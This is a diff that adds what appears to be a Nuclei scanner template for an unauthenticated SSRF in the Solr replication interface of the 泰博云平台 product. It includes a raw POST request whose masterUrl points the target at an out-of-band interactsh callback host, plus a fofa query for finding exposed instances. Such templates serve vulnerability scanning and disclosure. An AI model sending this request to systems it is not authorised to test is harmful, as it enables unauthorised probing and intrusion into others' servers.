@@ -1,0 +1,24 @@
+http:
+    - matchers:
+        - part: interactsh_protocol
+          type: word
+          words:
+            - dns
+      raw:
+        - |
+          POST /solr/collection1/replication/?command=fetchindex&masterUrl=http://{{interactsh-url}} HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+id: taibo-replication-ssrf
+info:
+    author: Superhero
+    description: |-
+        fofa: title="泰博云平台"
+        泰博云平台 replication 接口存在服务器请求伪造漏洞。因此攻击者可利用该漏洞在未经身份验证的情况下访问某些受限资源.获取内部服务器信息，使系统处于极不安全状态。
+    name: 泰博云平台 replication SSRF漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488602&idx=1&sn=e8637ef33c7dc93d1ed9e18c740ee782&chksm=c267a169f510287f34ce8ca27c4ea2da51663abf7c16f6e9d5676df57fff207ebfbc23afcb14&token=582574297&lang=zh_CN#rd
+    severity: high
+    tags:
+        - SSRF
+        - solr
